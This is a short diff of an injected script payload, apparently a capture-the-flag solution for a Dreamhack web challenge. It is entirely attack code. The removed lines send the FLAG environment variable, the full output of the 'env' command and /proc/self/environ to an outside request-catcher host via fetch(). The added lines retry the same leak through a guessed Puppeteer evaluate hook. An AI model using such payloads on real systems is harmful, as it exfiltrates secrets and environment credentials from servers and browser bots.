@@ -1,7 +1,8 @@
 <script>
-  fetch("https://fbgpvdx.request.dreamhack.games?flag=A");
-  fetch("https://fbgpvdx.request.dreamhack.games?flag=" + encodeURIComponent(process.env.FLAG));
-  fetch("https://fbgpvdx.request.dreamhack.games?flag=" + encodeURIComponent(require('child_process').execSync('env').toString()));
-  fetch("https://fbgpvdx.request.dreamhack.games?flag=" + encodeURIComponent(require('fs').readFileSync('/proc/self/environ', 'utf8')));
-  fetch("https://fbgpvdx.request.dreamhack.games?flag=A");
+  (async () => {
+    const flag = await window.__puppeteer_evaluate(() => {
+      return process.env.FLAG;
+    });
+    fetch("https://fbgpvdx.request.dreamhack.games?flag=" + encodeURIComponent(flag));
+  })();
 </script>
